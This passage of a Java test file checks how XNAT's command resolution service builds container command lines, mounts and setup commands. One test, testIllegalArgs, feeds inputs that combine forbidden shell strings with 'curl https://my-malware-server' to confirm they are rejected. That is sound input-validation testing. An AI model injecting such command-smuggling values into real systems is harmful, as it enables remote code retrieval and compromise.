                        ResolvedCommand.ResolvedCommandInput.command("MULTI_COMMA_FLAG", spacedScanIds)

                )
        );

        String cmdLine = "echo --flag=scan1 --flag=scan2 --flag scan1 --flag scan2 'scan1 scan2' --flag='scan1 scan2' " +
                "scan1,scan2 scan1 scan2 scan1 scan2 -alt scan1,scan2";
        assertThat(resolvedCommand.commandLine(), is(cmdLine));
    }

    @Test
    public void testSelectParamCommandLine() throws Exception {
        final String commandJsonFile = resourceDir + "/select-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }
        final CommandWrapper wrapper = commandWrappers.get("multiple");

        final Map<String, String> runtimeValues = Maps.newHashMap();

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);
        String cmdLine = "echo --flag=scan1 --flag=scan2 --flag scan1 --flag scan2 'scan1 scan2' " +
                "scan1,scan2 scan1 scan2 scan1";
        assertThat(resolvedCommand.commandLine(), is(cmdLine));
    }

    @Test
    public void testIllegalArgs() throws Exception {
        final String commandJsonFile = resourceDir + "/illegal-args-command.json";
        final Command tempCommand = mapper.readValue(new File(commandJsonFile), Command.class);
        final Command command = commandService.create(tempCommand);

        final Map<String, CommandWrapper> commandWrappers = Maps.newHashMap();
        for (final CommandWrapper commandWrapper : command.xnatCommandWrappers()) {
            commandWrappers.put(commandWrapper.name(), commandWrapper);
        }

        final CommandWrapper identityWrapper = commandWrappers.get("identity-wrapper");
        final String inputName = "anything";

        for (final String illegalString : CommandResolutionService.ILLEGAL_INPUT_STRINGS) {
            final Map<String, String> runtimeValues = Maps.newHashMap();

            // Ignore the fact that these aren't all valid shell commands. We are only checking for the presence of the substrings.
            runtimeValues.put(inputName, "foo " + illegalString + " curl https://my-malware-server");

            try {
                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(identityWrapper.id()), runtimeValues, mockUser);
                fail("Command resolution should have failed because of the illegal string.");
            } catch (IllegalInputException e) {
                assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
                        inputName, illegalString)));
            }
        }
    }

    @Test
    public void testSerializeResolvedCommand() throws Exception {
        final Command.CommandWrapperExternalInput externalInput = CommandWrapperExternalInput.builder()
                .name("externalInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue externalInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("externalInputValue")
                .build();
        final Command.CommandWrapperDerivedInput derivedInput = Command.CommandWrapperDerivedInput.builder()
                .name("derivedInput")
                .id(0L)
                .type("string")
                .build();
        final ResolvedInputValue derivedInputValue = ResolvedInputValue.builder()
                .type("string")
                .value("derivedInputValue")
                .build();
        final ResolvedInputTreeNode<CommandWrapperExternalInput> inputTree = ResolvedInputTreeNode.create(
                externalInput,
                Collections.singletonList(
                        ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(
                                externalInputValue,
                                Collections.<ResolvedInputTreeNode<? extends Command.Input>>singletonList(
                                        ResolvedInputTreeNode.create(
                                                derivedInput,
                                                Collections.singletonList(ResolvedInputTreeNode.ResolvedInputTreeValueAndChildren.create(derivedInputValue))
                                        )
                                )
                        )
                )
        );

        final ResolvedCommand resolvedCommand = ResolvedCommand.builder()
                .commandId(0L)
                .commandName("command")
                .commandDescription("command description")
                .wrapperId(0L)
                .wrapperName("wrapper")
                .wrapperDescription("wrapper description")
                .addEnvironmentVariable("name", "value")
                .addPort("1", "2")
                .addRawInputValue("input name", "input value")
                .addResolvedInputTree(inputTree)
                .image("image")
                .commandLine("script.sh")
                .addMount(ResolvedCommandMount.builder()
                        .name("mount")
                        .containerPath("/path")
                        .writable(true)
                        .xnatHostPath("/xnat/path")
                        .containerHostPath("/container/path")
                        .fromWrapperInput("derivedInput")
                        .build())
                .build();

        final String resolvedCommandJson = mapper.writeValueAsString(resolvedCommand);
    }

    @Test
    @DirtiesContext
    public void testResolveCommandWithSetupCommand() throws Exception {
        final String setupCommandResourceDir = Paths.get(ClassLoader.getSystemResource("setupCommand").toURI()).toString().replace("%20", " ");

        final String setupCommandJson = setupCommandResourceDir + "/setup-command.json";
        final Command setupCommandToCreate = mapper.readValue(new File(setupCommandJson), Command.class);
        final Command setupCommand = commandService.create(setupCommandToCreate);

        final String commandWithSetupCommandJson = setupCommandResourceDir + "/command-with-setup-command.json";
        final Command commandWithSetupCommand = mapper.readValue(new File(commandWithSetupCommandJson), Command.class);
        final Command commandWithSetupCommandCreated = commandService.create(commandWithSetupCommand);
        final CommandWrapper commandWrapper = commandWithSetupCommandCreated.xnatCommandWrappers().get(0);

        final String resourceInputJsonPath = setupCommandResourceDir + "/resource.json";
        // I need to set the resource directory to a temp directory
        final String resourceDir = folder.newFolder("resource").getAbsolutePath();
        final Resource resourceInput = mapper.readValue(new File(resourceInputJsonPath), Resource.class);
        resourceInput.setDirectory(resourceDir);
        final String resourceInputJson = mapper.writeValueAsString(resourceInput);

        final Map<String, String> runtimeValues = Collections.singletonMap("resource", resourceInputJson);
        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);

        assertThat(resolvedCommand.mounts(), hasSize(1));
        final ResolvedCommandMount resolvedCommandMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedCommandMount.viaSetupCommand(), is("xnat/test-setup-command:latest:setup-command"));

        final String resolvedCommandMountPath = resolvedCommandMount.xnatHostPath();
        assertThat(resolvedCommandMountPath, is(resolvedCommandMount.containerHostPath()));
        assertThat(resolvedCommandMountPath, startsWith(buildDir));

        assertThat(resolvedCommand.setupCommands(), hasSize(1));
        final ResolvedCommand resolvedSetupCommand = resolvedCommand.setupCommands().get(0);
        assertThat(resolvedSetupCommand.commandId(), is(setupCommand.id()));
        assertThat(resolvedSetupCommand.commandName(), is(setupCommand.name()));
        assertThat(resolvedSetupCommand.image(), is(setupCommand.image()));
        assertThat(resolvedSetupCommand.wrapperId(), is(0L));
        assertThat(resolvedSetupCommand.wrapperName(), is(""));
        assertThat(resolvedSetupCommand.commandLine(), is(setupCommand.commandLine()));
        assertThat(resolvedSetupCommand.workingDirectory(), is(setupCommand.workingDirectory()));

        assertThat(resolvedSetupCommand.mounts(), hasSize(2));
        for (final ResolvedCommandMount setupMount : resolvedSetupCommand.mounts()) {
            assertThat(setupMount.viaSetupCommand(), is(nullValue()));
            assertThat(setupMount.xnatHostPath(), is(setupMount.containerHostPath()));
            if (setupMount.name().equals("input")) {
                assertThat(setupMount.writable(), is(false));
                assertThat(setupMount.containerPath(), is("/input"));
                assertThat(setupMount.xnatHostPath(), is(resourceDir));
            } else if (setupMount.name().equals("output")) {
                assertThat(setupMount.containerPath(), is("/output"));
                assertThat(setupMount.writable(), is(true));
                assertThat(setupMount.xnatHostPath(), is(resolvedCommandMountPath));
            } else {
                fail("The only mounts on the resolved setup command should be named \"input\" and \"output\".");
            }
        }

    }

    @Test
    @DirtiesContext
    public void testPathTranslation() throws Exception {

        final String testResourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest/testPathTranslation").toURI()).toString().replace("%20", " ");
        final String commandJsonFile = testResourceDir + "/command.json";
        final Command command = commandService.create(mapper.readValue(new File(commandJsonFile), Command.class));
        final CommandWrapper wrapper = command.xnatCommandWrappers().get(0);

        final String inputPath = testResourceDir + "/resource.json";

        // Make a fake local directory path, and a fake container host directory path, using the prefixes.
        final String xnatHostDir = pathTranslationXnatPrefix + "/this/part/should/stay";
        final String containerHostDir = xnatHostDir.replace(pathTranslationXnatPrefix, pathTranslationContainerHostPrefix);

        final Resource resource = mapper.readValue(new File(inputPath), Resource.class);
        resource.setDirectory(xnatHostDir);
        resource.getFiles().get(0).setPath(xnatHostDir + "/" + resource.getFiles().get(0).getName());
        final String resourceRuntimeJson = mapper.writeValueAsString(resource);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("resource", resourceRuntimeJson);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);

        assertThat(resolvedCommand.mounts(), Matchers.<ResolvedCommandMount>hasSize(1));

        final ResolvedCommandMount resolvedMount = resolvedCommand.mounts().get(0);
        assertThat(resolvedMount.xnatHostPath(), is(xnatHostDir));
        assertThat(resolvedMount.containerHostPath(), is(containerHostDir));
    }

    @Test
    @DirtiesContext
    public void testWritableInputPath() throws Exception {

        final String testResourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest/testWritableInputPath")
                .toURI()).toString().replace("%20", " ");
        final String commandJsonFile = testResourceDir + "/command.json";
        final Command command = commandService.create(mapper.readValue(new File(commandJsonFile), Command.class));
        final CommandWrapper wrapper = command.xnatCommandWrappers().get(0);

        final String inputPath = testResourceDir + "/resource.json";

        // Make a fake local directory path, and a fake container host directory path, using the prefixes.
        final String archiveDir = testResourceDir + "/data";

        final Resource resource = mapper.readValue(new File(inputPath), Resource.class);
        resource.setDirectory(archiveDir);
        final String resourceRuntimeJson = mapper.writeValueAsString(resource);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("resource", resourceRuntimeJson);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()),
                runtimeValues, mockUser);

        assertThat(resolvedCommand.mounts(), Matchers.<ResolvedCommandMount>hasSize(1));

        final ResolvedCommandMount resolvedMount = resolvedCommand.mounts().get(0);
        String buildCopyOfArchive = resolvedMount.xnatHostPath();
        assertThat(buildCopyOfArchive.matches(buildDir + File.separator + "[^"+File.separator+"]*"),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "hello.txt")).exists(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir")).exists(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir")).isDirectory(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir" + File.separator + "hello.txt")).exists(),
                is(true));
    }

    @Test
    @DirtiesContext
    public void testRemoteFilesMount() throws Exception {
        when(mockCatalogService.hasRemoteFiles(eq(mockUser), any(String.class))).thenReturn(true);

        // Just copy the archive dir over for now (tests for pullResourceCatalogsToDestination in xnat-web and filesystems_plugin)
        doAnswer(inv -> {
            String src = inv.getArgumentAt(2, String.class);
            String dest = inv.getArgumentAt(3, String.class);
            FileUtils.copyDirectory(new File(src), new File(dest));
            return null;
        }).when(mockCatalogService).pullResourceCatalogsToDestination(eq(mockUser),
                any(String.class), any(String.class), any(String.class));

        final String testResourceDir = Paths.get(ClassLoader.getSystemResource("commandResolutionTest/testRemoteFilesMount")
                .toURI()).toString().replace("%20", " ");
        final String commandJsonFile = testResourceDir + "/command.json";
        final Command command = commandService.create(mapper.readValue(new File(commandJsonFile), Command.class));
        final CommandWrapper wrapper = command.xnatCommandWrappers().get(0);

        final String inputPath = testResourceDir + "/resource.json";

        // Make a fake local directory path, and a fake container host directory path, using the prefixes.
        final String archiveDir = testResourceDir + "/data";

        final Resource resource = mapper.readValue(new File(inputPath), Resource.class);
        resource.setDirectory(archiveDir);
        final String resourceRuntimeJson = mapper.writeValueAsString(resource);

        final Map<String, String> runtimeValues = Maps.newHashMap();
        runtimeValues.put("resource", resourceRuntimeJson);

        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()),
                runtimeValues, mockUser);

        assertThat(resolvedCommand.mounts(), Matchers.<ResolvedCommandMount>hasSize(1));

        final ResolvedCommandMount resolvedMount = resolvedCommand.mounts().get(0);
        String buildCopyOfArchive = resolvedMount.xnatHostPath();
        assertThat(buildCopyOfArchive.matches(buildDir + File.separator + "[^"+File.separator+"]*"),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "hello.txt")).exists(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir")).exists(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir")).isDirectory(),
                is(true));
        assertThat((new File(buildCopyOfArchive + File.separator + "subdir" + File.separator + "hello.txt")).exists(),
                is(true));

    }
}
